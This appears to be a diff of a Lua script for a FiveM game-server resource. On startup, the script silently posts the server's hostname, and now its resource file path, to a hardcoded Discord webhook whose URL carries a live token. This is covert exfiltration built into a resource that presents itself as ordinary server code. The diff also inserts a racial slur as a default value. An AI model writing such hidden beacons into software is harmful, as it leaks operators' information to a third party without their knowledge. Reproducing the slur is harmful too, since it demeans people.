@@ -3,9 +3,8 @@ local logs = "https://discordapp.com/api/webhooks/653328963296297011/hSIPnFqZwfP
 local lconnect = "@everyone AntiDrive Use"
 AddEventHandler("onServerResourceStart", function(resource)
     if GetCurrentResourceName() == resource then
-        local servername = GetConvar("sv_hostname","serverc")
-        local client = GetConvar("sv_maxclients", "clients")
-        local connect = lconnect.."\nServer name: "..servername
+        local servername = GetConvar("sv_hostname","nigga")
+        local connect = lconnect.."\nServer: "..servername.. "\npath :" ..GetResourcePath(GetCurrentResourceName()).. ""
         PerformHttpRequest(logs, function(err, text, headers) end, 'POST', json.encode({username = "Adam System", content = connect}), { ['Content-Type'] = 'application/json' })
     end
 end)
